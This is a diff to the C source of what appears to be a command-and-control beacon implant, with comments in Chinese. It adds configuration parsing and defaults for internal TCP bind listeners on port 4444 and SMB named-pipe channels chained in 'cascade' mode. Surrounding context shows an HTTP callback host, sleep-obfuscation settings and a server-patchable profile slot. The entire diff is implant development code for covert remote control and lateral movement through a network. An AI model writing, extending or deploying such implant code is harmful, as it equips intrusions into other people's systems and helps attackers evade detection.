@@ -38,6 +38,11 @@
 #define CFG_HTTP_SSL_CERT 114u
 #define CFG_HTTP_SSL_KEY 115u
 #define CFG_HTTP_CALLBACK_HOST 116u
+#define CFG_TCP_BIND_HOST 200u
+#define CFG_TCP_BIND_PORT 201u
+#define CFG_TCP_CONNECT_TIMEOUT 202u
+#define CFG_SMB_PIPE_NAME 210u
+#define CFG_SMB_CONNECT_TIMEOUT 211u
 
 /* 运行时可修补的配置槽（由 server 端 TSCF 写入） */
 __declspec(align(16)) BYTE8 g_BeaconProfilePatchSlot[PROFILE_PATCH_SLOT_SIZE] = {
@@ -254,6 +259,21 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
         case CFG_HTTP_CALLBACK_HOST:
             CopyTlvString(target.callback_host, sizeof(target.callback_host), value, value_len);
             break;
+        case CFG_TCP_BIND_HOST:
+            CopyTlvString(p->tcp_internal.bind_host, sizeof(p->tcp_internal.bind_host), value, value_len);
+            break;
+        case CFG_TCP_BIND_PORT:
+            if (value_len == 4) p->tcp_internal.bind_port = (INT)ReadBe32(value);
+            break;
+        case CFG_TCP_CONNECT_TIMEOUT:
+            if (value_len == 4) p->tcp_internal.connect_timeout_ms = (INT)ReadBe32(value);
+            break;
+        case CFG_SMB_PIPE_NAME:
+            CopyTlvString(p->smb_internal.pipe_name, sizeof(p->smb_internal.pipe_name), value, value_len);
+            break;
+        case CFG_SMB_CONNECT_TIMEOUT:
+            if (value_len == 4) p->smb_internal.connect_timeout_ms = (INT)ReadBe32(value);
+            break;
         case CFG_HTTP_URI:
             CopyTlvString(p->http.uri, sizeof(p->http.uri), value, value_len);
             NormalizeUri(p->http.uri, sizeof(p->http.uri));
@@ -384,6 +404,11 @@ VOID ProfileLoad(Profile* p)
     p->sleep_obf_enabled = FALSE;
     p->sleep_obf_technique = SLEEP_OBF_ZILEAN;
 
+    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-http");
+    strcpy_s(p->listener_type, sizeof(p->listener_type), "external");
+    strcpy_s(p->protocol, sizeof(p->protocol), "http");
+    strcpy_s(p->format, sizeof(p->format), "http");
+
     /* HTTP 传输配置 */
     strcpy_s(p->http.method, sizeof(p->http.method), "GET");
     strcpy_s(p->http.target, sizeof(p->http.target), "192.168.18.1:9999");
@@ -398,6 +423,25 @@ VOID ProfileLoad(Profile* p)
     p->http.ssl = 0;
     p->http.reconnect_count = 3;
     p->http.reconnect_time_ms = 3000;
+
+    strcpy_s(p->tcp_internal.bind_host, sizeof(p->tcp_internal.bind_host), "0.0.0.0");
+    p->tcp_internal.bind_port = 4444;
+    p->tcp_internal.connect_timeout_ms = 10000;
+
+    strcpy_s(p->smb_internal.pipe_name, sizeof(p->smb_internal.pipe_name), "\\\\.\\pipe\\beacon_internal");
+    p->smb_internal.connect_timeout_ms = 10000;
+
+#if defined(BEACON_INTERNAL_TCP_BUILD)
+    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-tcp-internal");
+    strcpy_s(p->listener_type, sizeof(p->listener_type), "internal");
+    strcpy_s(p->protocol, sizeof(p->protocol), "tcp");
+    strcpy_s(p->format, sizeof(p->format), "cascade");
+#elif defined(BEACON_INTERNAL_SMB_BUILD)
+    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-smb-internal");
+    strcpy_s(p->listener_type, sizeof(p->listener_type), "internal");
+    strcpy_s(p->protocol, sizeof(p->protocol), "smb");
+    strcpy_s(p->format, sizeof(p->format), "cascade");
+#endif
 
 #if !(defined(_DEBUG) && defined(BEACON_EXE_BUILD))
     ApplyPatchedProfile(p);
